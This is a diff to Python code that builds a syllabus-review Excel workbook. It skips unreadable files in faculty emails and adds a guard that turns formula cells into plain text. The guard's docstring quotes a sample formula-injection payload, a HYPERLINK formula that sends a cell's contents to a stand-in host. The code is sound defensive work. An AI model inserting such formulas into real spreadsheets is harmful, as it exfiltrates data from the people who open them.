@@ -48,6 +48,8 @@ def faculty_note(r: dict) -> str:
     """A short, polite email the coordinator can copy. Empty if there's nothing to say."""
     course = r["course"]
     objs = r.get("objectives", [])
+    if r.get("status") == "unreadable":
+        return ""          # our problem (couldn't open it), not something to email the professor about
     if not objs:
         return (f"Hi,\n\nWe couldn't find learning objectives in the {course} syllabus"
                 f"{' (' + r['file']['name'] + ')' if r.get('file', {}).get('name') else ''}. "
@@ -112,6 +114,16 @@ def _landscape(ws):
     ws.page_setup.fitToWidth, ws.page_setup.fitToHeight = 1, 0
     ws.sheet_properties.pageSetUpPr.fitToPage = True
     ws.print_title_rows = "1:1"
+
+
+def _no_formulas(wb):
+    """Syllabus text comes from professors. A cell like '=HYPERLINK("http://x?"&A1)' must show as
+    text, never run as a formula in the reviewer's Excel."""
+    for ws in wb.worksheets:
+        for row in ws.iter_rows():
+            for c in row:
+                if c.data_type == "f":
+                    c.data_type = "s"
 
 
 def build_review_xlsx(audit: dict) -> bytes:
@@ -215,6 +227,7 @@ def build_review_xlsx(audit: dict) -> bytes:
         ov.cell(ov.max_row, 7).font = Font(color="1155CC" if p["kind"] != "identical" else RED_FG, bold=True)
     _landscape(ov)
 
+    _no_formulas(wb)
     buf = io.BytesIO()
     wb.save(buf)
     return buf.getvalue()
